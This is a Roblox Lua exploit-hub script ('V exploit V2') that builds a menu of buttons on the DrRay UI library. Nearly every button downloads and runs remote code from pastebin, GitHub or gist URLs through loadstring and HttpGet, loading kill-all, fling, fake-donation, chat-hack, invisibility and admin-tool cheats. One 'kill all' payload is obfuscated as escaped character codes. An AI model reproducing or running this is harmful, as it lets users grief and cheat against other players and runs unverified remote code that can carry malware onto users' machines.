local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
local window = DrRayLibrary:Load("V exploit V2", "Default")

-- Exclusive 1 For some scripts only
local tab = DrRayLibrary.newTab("ExclusiveS 1", "ImageIdHere")

tab.newButton("Infinite yeild", "Infinite yield spawner", function()
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Yield.txt"))()
    print('Hello!')
end)

tab.newButton("Glitched map", "Makes map look rainbow and glitched", function()
    --Made by SUPERSONIC GAMERZ 
while true do
    for _, part in ipairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            local r = math.random()
            local g = math.random()
            local b = math.random()
            part.BrickColor = BrickColor.new(Color3.new(r, g, b))
        end
    end
    wait(0.5)
end
    print('Hello!')
end)

tab.newButton("Ice hub", "Ice hub script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))() 
    print('Hello!')
end)

tab.newButton("Admin tools", "Admin tools giver", function()
loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()
    print('Hello!')
end)

tab.newButton("1x1x1x1 gui", "1x1x1x1 gui!", function()
loadstring(game:HttpGet('https://pastebin.com/raw/1AvYgmMU'))() 
    print('Hello!')
end)

tab.newButton("Nuke placer", "Nuke placing tool giver!", function()
loadstring(game:HttpGet('https://pastebin.com/raw/80vArD20'))()
    print('Hello!')
end)

tab.newButton("The script v hub", "V hub scriPt", function()
loadstring(game:HttpGet('https://pastebin.com/raw/dzNcLr0C'))()
    print('Hello!')
end)

-- Exclusive Tab number 2 for some scripts
local tab = DrRayLibrary.newTab("ExclusiveS 2", "ImageIdHere")

tab.newButton("FE UTG Gui", "Utg gui will load", function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/3e50ce0fdd03713dfbeb1845ee6f52d7/raw/630318908f56a984db9568a89e33eadb7998158a/feutg1",true))()
    print('Loading')
end)

tab.newButton("LN Hub Bladeball", "LN Hub Bladeball is hub itself", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/No6No6No7yt/Lumin-Hub/main/BladeV4.lua'))()
    print('LN hub loaded')
end)

tab.newButton("Telekenisis", "Get Telekenisis Ability", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()
    print('Tool given')
end)

tab.newButton("Yeet Gui", "Yeet Gui Load", function()
loadstring(game:HttpGet("https://pastebin.com/raw/saMtiek2",true))()
    print('Loaded Gui')
end)


tab.newButton("Fe kill all", "Kill all script everyone can see", function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\99\117\114\97\88\48\52\57\47\111\98\102\117\115\99\97\116\101\100\83\99\114\105\112\116\115\47\109\97\105\110\47\75\105\108\108\71\117\105\34\41\41\40\41\10")()
    print('Starting')
end)

tab.newButton("Fling people", "Fling script gui", function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/0ef7e0cc9f92a64c874a3c5a75c88ade/raw/0b9e8b37d1b9d2e2676707f76297ba9f530cb0bd/rocketfling",true))()
    print('Hello!')
end)

tab.newButton("Fly script", "Fly v3 script", function()
loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
    print('Hello!')
end)

-- Exclusives Number 3 tab for some scripts
local tab = DrRayLibrary.newTab("ExclusiveS 3", "ImageIdHere")

tab.newButton("Fake Donation [CC]", "Client Sided Script For plz donate", function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/o5u3/PLS-Donate/main/Fake-Donate.lua")))()
    print('Gui Loaded!')
end)

tab.newButton("Chat Hax", "Chat Hax For everyone", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Chat%20Hax%20Obfuscator'))()
    print('ChatHax Gui Loaded.')
end)

tab.newButton("Madox Hub", "Madox Hub Will Be loaded", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Fiend1sh/FiendMain/main/MadoxHubKey", true))()
    print('Modx Hub Loaded')
end)

tab.newButton("EZ Hub", "EZ Hub Launcher", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
    print('Launcher Loaded')
end)

tab.newButton("Nameless Admin", "Nameless Admin Loader", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
    print('Nameless Admin Loaded')
end)

tab.newButton("Universal Invisible Gui", "Invisible Gui Universal", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Invisible%20Gui'))()
    print('Universal')
end)

tab.newButton("Orbit Script", "Orbiter Script", function()
loadstring(game:HttpGet('https://pastebin.com/raw/BsJ4xfXu'))()
    print('Script Loaded')
end)

-- Settings Tab
local tab = DrRayLibrary.newTab("Settings", "ImageIdHere")

local mainColor = Color3.fromRGB(10, 30, 10) -- Customize as you wish; these are in RGB format. (mainColor applies to main colors like background, buttons, etc.)

local secondColor = Color3.fromRGB(50, 50, 10) -- Secondary Color; applies to Toggle when activated and slider background.

window:SetTheme(mainColor, secondColor)

tab.newInput("Introduction", "Introduce Yourself", function(text)
    print("Entered text: " .. text)
end)

window:Open()
window:Close()
window:Hide()
window:Show()